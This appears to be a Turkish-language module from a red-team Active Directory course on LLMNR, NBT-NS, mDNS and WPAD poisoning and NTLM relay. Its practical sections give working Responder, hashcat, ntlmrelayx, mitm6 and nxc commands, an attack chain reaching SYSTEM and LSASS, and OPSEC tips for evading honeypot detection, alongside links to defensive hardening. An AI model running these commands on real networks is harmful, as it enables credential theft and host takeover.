## 1. Kavramsal Temel — Neden Var?

Bir saldırgan ağa bağlandı ama **hiçbir kimliği yok**. İlk hash'i nereden bulur? Cevap: Windows'un **isim çözümleme geri-düşüş (fallback) zincirinde** bir tasarım kusurundadır.

Bir Windows makinesi bir isim çözmek istediğinde (örn. yanlış yazılmış `\\fileservr`), önce DNS'i dener. DNS başarısız olursa **yayın (broadcast/multicast) tabanlı** protokollere düşer:

> **LLMNR (UDP 5355), NBT-NS (UDP 137) ve mDNS (UDP 5353) "Bu ismi kim biliyor?" diye TÜM yerel ağa bağırır. Bu yayına HERKES cevap verebilir. Saldırgan "Ben biliyorum!" der; kurban ona güvenip NTLM kimlik doğrulaması yapar — ve NetNTLMv2 hash'ini saldırgana teslim eder.**

Bu, hiçbir istismar (exploit) gerektirmeyen, sadece "yanlış cevabı ilk veren kazanır" yarışıdır. Kurumsal ağlarda yazım hataları, ölü paylaşımlar ve otomatik bağlantılar sürekli bu yayınları üretir → saldırgan pasif dinlemeyle **dakikalar içinde** hash toplar.

**Analoji:** Kalabalık bir odada biri "Ahmet'in telefon numarasını kim biliyor?" diye bağırır. Sen (saldırgan) hemen "Ben biliyorum, bana söyle ben iletirim!" dersin. Kişi güvenip sana kimlik bilgisini verir.

## 2. Teknik Derinlik — Zehirleme ve NetNTLMv2

### 2.1 Çözümleme geri-düşüş zinciri

```
   Kurban: \\fileservr\share  çözümlemek istiyor
   ┌──────────────────────────────────────────────┐
   │ 1) DNS sorgusu (UDP 53)     → NXDOMAIN (yok)  │
   │ 2) LLMNR (UDP 5355, multicast 224.0.0.252)   │──▶ SALDIRGAN cevap verir:
   │ 3) NBT-NS (UDP 137, broadcast)               │    "fileservr = 10.10.10.66 (BEN)"
   │ 4) mDNS (UDP 5353)                           │
   └──────────────────────────────────────────────┘
                     │
                     ▼
   Kurban 10.10.10.66'ya SMB ile bağlanır ve NTLM auth başlatır
```

### 2.2 NetNTLMv2 challenge-response akışı

```
Kurban (client)                          Saldırgan (sahte sunucu)
  │ NEGOTIATE                                │
  │─────────────────────────────────────────▶│
  │              CHALLENGE (8-byte nonce)     │  ← saldırgan rastgele challenge yollar
  │◀─────────────────────────────────────────│
  │ AUTHENTICATE: NTProofStr + response       │
  │   = HMAC-MD5(NTLMv2Hash, challenge+blob)  │
  │─────────────────────────────────────────▶│  ← YAKALANDI
```

Yakalanan **NetNTLMv2** doğrudan pass-the-hash için kullanılamaz (challenge'a bağlı), ama:
1. **Offline kırılabilir** (Hashcat mode 5600) → düz parola.
2. **Relay edilebilir** (imzalama yoksa) → başka bir hedefe canlı iletilir ([02.x / Modül 08](../Modul_08_Koersiyon_ve_NTLM_Relay/)).

> **Kritik ayrım:** NetNTLMv2 ≠ NT hash. Kırarsan parolayı alırsın; relay edersen hash'i hiç kırmadan kimliği kullanırsın. Relay, imzalama (SMB signing) kapalıysa çalışır → [Blue 08.2](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.2_SMB_Signing_Zorlama.md).

### 2.3 NTLMSSP mesaj tipleri (paket seviyesi)

Challenge-response aslında **NTLM Security Support Provider (NTLMSSP)** üç mesajından oluşur; her biri SMB/HTTP içine gömülür:

```
   Type 1 (NEGOTIATE)   : client → server. Yetenek bayrakları (NEGOTIATE_SIGN,
                          NEGOTIATE_KEY_EXCH, NEGOTIATE_EXTENDED_SESSIONSECURITY…)
   Type 2 (CHALLENGE)   : server → client. 8-byte ServerChallenge + TargetInfo (AV_PAIR'ler:
                          MsvAvNbDomainName, MsvAvTimestamp, MsvAvChannelBindings…)
   Type 3 (AUTHENTICATE): client → server. NTProofStr + encrypted session key + domain\user
```

> **Relay'i kıran iki bayrak:** Type 2'deki `NEGOTIATE_SIGN`/`NEGOTIATE_ALWAYS_SIGN` **imzalama** ister (relay'i bozar); TargetInfo'daki `MsvAvChannelBindings` (EPA) ise LDAPS/HTTPS relay'ini bozar. Savunma bu ikisini zorlar → [Blue 08.1](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.1_LDAP_Signing_ve_Channel_Binding.md). Downgrade edebilirsen (drop-the-MIC/CVE-2019-1040 sınıfı) relay yeniden mümkün olur.

### 2.4 WPAD — bonus zehirleme kanalı

`WPAD` (Web Proxy Auto-Discovery) istemcileri `http://wpad/wpad.dat` proxy config'i arar; isim çözümleme yine LLMNR/NBT-NS'e düşer. Responder sahte WPAD sunup **HTTP NTLM auth** (kimlik doğrulamalı proxy) tetikler → tarayıcı trafiğinden hash. `-w` bayrağı bunu açar.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Responder ile pasif zehirleme + toplama

```bash
# LLMNR/NBT-NS/mDNS dinle ve zehirle (analiz için önce -A ile pasif izle)
responder -I eth0 -A            # ANALİZ modu: kimse zehirlenmez, sadece hangi isimler soruluyor gör
responder -I eth0 -wv           # aktif: sahte WPAD dahil, hash yakala

# Yakalanan hash'ler:
#   /usr/share/responder/logs/  → SMB-NTLMv2-SSP-10.10.10.42.txt
```

**Örnek yakalanan hash:**
```
[SMB] NTLMv2-SSP Client   : 10.10.10.42
[SMB] NTLMv2-SSP Username : CORP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:A1B2...:0101000000...
```

### 3.2 Offline kırma (Hashcat)

```bash
# NetNTLMv2 = mode 5600
hashcat -m 5600 jsmith_hash.txt rockyou.txt -r rules/best64.rule
# çıktı: jsmith::CORP:...:Summer2024!   ← düz parola ele geçti
```

### 3.3 Doğrudan relay (kırma yok — imzalama kapalıysa)

```bash
# 1) Responder'da SMB/HTTP'yi KAPAT (relay ile çakışmasın)
#    /etc/responder/Responder.conf → SMB = Off, HTTP = Off
# 2) ntlmrelayx ile yakalanan auth'u imzalamasız hedefe ilet
impacket-ntlmrelayx -tf targets.txt -smb2support -i
#   -i = başarılı relay'de interaktif SMB shell aç
```
Tam relay zinciri ve hedef seçimi → [Modül 08 — Koersiyon ve NTLM Relay](../Modul_08_Koersiyon_ve_NTLM_Relay/).

### 3.4 mitm6 (IPv6 DNS takeover — daha güçlü varyant)

```bash
# Windows IPv6'yı varsayılan tercih eder; sahte DHCPv6 + DNS ile trafiği ele geçir
mitm6 -d corp.local
# eş zamanlı: ntlmrelayx ile LDAP/LDAPS'e relay (ör. RBCD kurmak için)
impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local --delegate-access
```

### 3.5 Relay hedef seçimi — nereye iletmeli?

Yakalanan kimliğin **yetkisine** göre relay hedefi değişir:

| Yakalanan kimlik | Relay hedefi | Kazanç |
|------------------|--------------|--------|
| Makine hesabı (WS$) | `ldaps://DC` `--delegate-access` | RBCD kur → o makineyi ele geçir |
| Domain admin | `smb://herhangi-DC` | Doğrudan DA erişimi/DCSync |
| Sıradan kullanıcı + ADCS var | `http://CA/certsrv` (ESC8) | Sertifika al → PKINIT → [Modül 07](../Modul_07_AD_CS_PKI_Saldirilari/) |
| Herhangi | SMB signing kapalı sunucu | Dosya/komut yürütme |

```bash
# Relay edilecek imzalamasız hedefleri bul (relay öncesi zorunlu keşif)
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt    # signing:False olanlar
```

### 3.6 Gerçek-dünya zincir örneği

```
   1) responder -A          → "fileservr" sık sorulan bir yazım hatası, kimse cevaplamıyor
   2) nxc --gen-relay-list  → SRV12, SRV20 signing KAPALI
   3) Responder SMB/HTTP off + ntlmrelayx -tf targets.txt -smb2support -i
   4) responder -wv         → jsmith \\fileservr'a bağlanmaya çalışır → auth relay'lenir
   5) SRV12'de interaktif SMB shell → SeImpersonate → SYSTEM → LSASS → Modül 03
```

**OPSEC notları:**
- **Önce `-A` (analiz) ile dinle.** Hangi isimlerin sorulduğunu görmeden zehirlemek gürültü yaratır. Bal küpü (honey) isim çözümleme sorguları savunmacılar tarafından tuzak olarak kurulur — [Blue 04.4](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.4_Honeytoken_ve_Honey_Account.md). Bilinmedik bir isme (örn. `HONEYSHARE`) cevap verirsen yakalanırsın.
- LLMNR/NBT-NS **kapalıysa** (GPO ile, [Blue 08.4](../../2-Blue_Team/Modul_08_Protokol_Sertlestirme_ve_Relay_Onleme/08.4_Koersiyon_Onleme_PetitPotam_PrinterBug.md)) bu teknik ölür → o zaman koersiyon ([Modül 08](../Modul_08_Koersiyon_ve_NTLM_Relay/)) ile auth'u sen tetikle.
- Relay > kırma: SMB signing kapalı bir hedef bulursan parolayı hiç kırmadan kimliği kullanırsın; iz de daha azdır (offline kırma diskte hash bırakmaz ama relay ağda görünür).
